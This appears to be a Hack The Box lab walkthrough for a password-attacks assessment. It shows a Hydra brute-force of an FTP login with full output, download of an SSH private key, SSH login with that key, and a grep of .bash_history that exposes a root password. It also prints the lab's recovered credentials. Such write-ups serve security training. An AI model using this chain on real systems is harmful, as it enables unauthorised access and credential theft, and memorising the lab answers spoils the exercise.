1. Download the HTB resource file containing the username and password list
2. Use Hydra to bruteforce the login

```Bash
hydra -L username.list -P password.list ftp://ip_address -t 40 -f -u 
```

```Bash
┌──(root㉿kali)-[/home/kali/Password_Attacks]
└─# hydra -L username.list -P password.list -t 64 -f ftp://10.129.103.157 -u
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizatins, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-05 11:54:31
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session foud, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 21112 login tries (l:104/p:203), ~330 tries per task
[DATA] attacking ftp://10.129.103.157:21/
[STATUS] 660.00 tries/min, 660 tries in 00:01h, 20466 to do in 00:32h, 50 active
[STATUS] 651.00 tries/min, 1953 tries in 00:03h, 19173 to do in 00:30h, 50 active
[STATUS] 648.00 tries/min, 4536 tries in 00:07h, 16590 to do in 00:26h, 50 active                               
[STATUS] 658.33 tries/min, 9875 tries in 00:15h, 11251 to do in 00:18h, 50 active
[STATUS] 659.70 tries/min, 13194 tries in 00:20h, 7932 to do in 00:13h, 50 active
[21][ftp] host: 10.129.103.157   login: mike   password: 7777777
[STATUS] attack finished for 10.129.103.157 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-05 12:19:10
```

1. Log into FTP

```Bash
┌──(root㉿kali)-[/home/kali/Password_Attacks]
└─# ftp mike@10.129.103.157 
Connected to 10.129.103.157.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
```

1. Browse the FTP Server

```Bash
ftp> ls
229 Entering Extended Passive Mode (|||5345|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000          554 Feb 09  2022 authorized_keys
-rw-------    1 1000     1000         2546 Feb 09  2022 id_rsa
-rw-r--r--    1 1000     1000          570 Feb 09  2022 id_rsa.pub
```

1. Download the id_rsa file

```Bash
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||16102|)
150 Opening BINARY mode data connection for id_rsa (2546 bytes).
100% |**********************************************************************|  2546        9.75 MiB/s    00:00 ETA
226 Transfer complete.
2546 bytes received in 00:00 (4.85 KiB/s)
```

```Bash
ot㉿kali)-[/home/kali/Password_Attacks]
└─# ls
custom.rule  id_rsa  Password-Attacks.zip  password.list  Password.zip  username.list
```

1. Use the id_rsa to log into the SSH server

- First we have to change the permissions to make it executable

```Bash
chmod 600 id_rsa
```

- Then we can log into ssh with it

```Bash
└─$ sudo ssh -i id_rsa mike@10.129.103.157
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May  5 17:36:52 BST 2025

  System load:  0.0               Processes:               162
  Usage of /:   31.4% of 8.79GB   Users logged in:         0
  Memory usage: 11%               IPv4 address for ens192: 10.129.103.157
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

214 updates can be applied immediately.
165 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Feb  9 17:37:10 2022 from 10.129.202.64
mike@skills-easy:~$
```

1. Enumerate the .bash_history in the default directory to find the password

```Bash
mike@skills-easy:~$ ls -la
total 40
drwxr-xr-x 4 mike mike 4096 Feb 10  2022 .
drwxr-xr-x 3 root root 4096 Feb  9  2022 ..
-rw------- 1 mike mike 5900 Feb 10  2022 .bash_history
-rw-r--r-- 1 mike mike  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 mike mike 3771 Feb 25  2020 .bashrc
drwx------ 2 mike mike 4096 Feb  9  2022 .cache
-rw-r--r-- 1 mike mike  807 Feb 25  2020 .profile
drwx------ 2 mike mike 4096 Feb  9  2022 .ssh
-rw------- 1 mike mike 2859 Feb  9  2022 .viminfo
mike@skills-easy:~$ grep root .bash_history
analysis.py -u root -p dgb6fzm0ynk@AME9pqu
```